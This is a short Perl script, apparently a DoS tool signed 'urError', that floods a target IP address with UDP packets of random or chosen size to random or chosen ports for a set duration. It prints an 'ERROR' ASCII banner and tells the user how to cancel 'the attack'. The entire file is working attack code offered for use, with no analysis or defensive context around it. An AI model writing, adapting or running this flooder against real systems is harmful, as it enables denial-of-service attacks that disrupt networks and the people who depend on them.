#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##############
# urError
##############

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;
                                                                    
88888888888  88888888ba   88888888ba     ,ad8888ba,    88888888ba   
88           88      "8b  88      "8b   d8"'    `"8b   88      "8b  
88           88      ,8P  88      ,8P  d8'        `8b  88      ,8P  
88aaaaa      88aaaaaa8P'  88aaaaaa8P'  88          88  88aaaaaa8P'  
88"""""      88""""88'    88""""88'    88          88  88""""88'    
88           88    `8b    88    `8b    Y8,        ,8P  88    `8b    
88           88     `8b   88     `8b    Y8a.    .a8P   88     `8b   
88888888888  88      `8b  88      `8b    `"Y8888Y"'    88      `8b  
                                                                                                                                                                                                                                                  
EOTEXT

print "~To Cancel The Attack Press \'Ctrl-C\'\n\n";
print "|DNS|\t\t |Port|\t\t |Power|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To Cancel The Attack Press 'Ctrl-C'\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 